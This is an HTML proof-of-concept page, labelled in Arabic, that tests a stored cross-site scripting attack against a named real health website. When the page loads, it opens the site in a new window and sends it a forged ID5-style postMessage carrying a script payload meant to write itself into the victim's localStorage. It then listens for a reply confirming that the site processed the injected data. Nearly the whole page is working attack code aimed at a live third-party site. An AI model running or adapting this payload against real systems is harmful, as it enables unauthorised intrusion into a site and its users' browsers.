<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>اختبار الثغرة المخزنة (Stored XSS Test)</title>
    <style>
        body { background: #1a1a1a; color: #0f0; font-family: monospace; padding: 20px; }
        .status { border: 1px solid #0f0; padding: 10px; margin-bottom: 10px; }
        .detected { color: #ff00ff; font-weight: bold; }
    </style>
</head>
<body>
    <h2>جاري فحص إمكانية تحويل الثغرة إلى Stored...</h2>
    <div id="status" class="status">بدء العملية...</div>
    <div id="logs"></div>

    <script>
        let victimWindow;
        const log = (msg, isSpecial = false) => {
            const div = document.getElementById('logs');
            div.innerHTML += `<p class="${isSpecial ? 'detected' : ''}">[${new Date().toLocaleTimeString()}] ${msg}</p>`;
        };

        // 1. تشغيل الهجوم
        function launchStoredTest() {
            log("فتح نافذة الضحية...");
            victimWindow = window.open("https://www.webmd.com", "VictimSite");

            setTimeout(() => {
                log("محاولة حقن كود تتبع في التخزين المحلي (LocalStorage)...");
                
                // الـ Payload هنا يحاول كتابة نفسه داخل الـ LocalStorage الخاص بالضحية
                const payload = {
                    _isId5Message: true,
                    type: "ID5_STORAGE_UPDATE", 
                    payload: {
                        // كود يحاول التنفيذ وتخزين نفسه
                        identity: "STORED_XSS_TEST_DATA",
                        scripts: "<script>localStorage.setItem('hacked', 'true'); console.log('Stored Successful');<\/script>"
                    }
                };

                victimWindow.postMessage(payload, "*");
                log("تم إرسال الـ Payload. انتظر 10 ثوانٍ...");
            }, 5000);

            // 2. فحص الاستجابة (هل الموقع سرب البيانات المخزنة؟)
            window.addEventListener("message", (event) => {
                if (event.data && JSON.stringify(event.data).includes("STORED_XSS_TEST_DATA")) {
                    log("!!! تأكيد: الموقع استقبل البيانات وقام بمعالجتها !!!", true);
                    log("الآن قم بتحديث صفحة الضحية يدوياً، إذا وجدنا 'hacked' في الـ LocalStorage فهي Stored!");
                }
            });
        }

        window.onload = launchStoredTest;
    </script>
</body>
</html>
